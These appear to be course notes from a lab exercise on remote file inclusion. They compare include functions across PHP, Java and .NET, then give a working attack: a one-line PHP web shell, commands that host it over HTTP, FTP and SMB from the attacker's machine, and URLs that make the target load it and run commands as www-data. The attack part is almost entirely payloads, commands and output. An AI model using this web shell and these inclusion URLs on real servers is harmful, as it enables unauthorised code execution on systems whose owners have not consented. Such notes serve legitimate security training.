## Local vs. Remote File Inclusion
|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`file_get_contents()`|✅|❌|✅|
|**Java**||||
|`import`|✅|✅|✅|
|**.NET**||||
|`@Html.RemotePartial()`|✅|❌|✅|
|`include`|✅|✅|✅|
## Verify RFI

```shell
3kjS@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include 

allow_url_include = On
```

```url
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```
![](Pasted%20image%2020260630155825.png)
## Remote Code Execution with RFI

```shell
3kjS@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
## HTTP

```shell
3kjS@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT> 
Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) 
...
```

```url
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```
![](Pasted%20image%2020260630160513.png)
## FTP

```shell
3kjS@htb[/htb]$ sudo python -m pyftpdlib -p 21 
[SNIP] >>> starting FTP server on 0.0.0.0:21, pid=23686 <<< 
[SNIP] concurrency model: async 
[SNIP] masquerade (NAT) address: None 
[SNIP] passive ports: None
```

```url
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```
![](Pasted%20image%2020260630161258.png)

```shell
3kjS@htb[/htb]$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@<OUR_IP>/shell.php&cmd=id' 
...SNIP... 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## SMB

```shell
3kjS@htb[/htb]$ impacket-smbserver -smb2support share $(pwd)
```

```url
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```
![](Pasted%20image%2020260630161409.png)
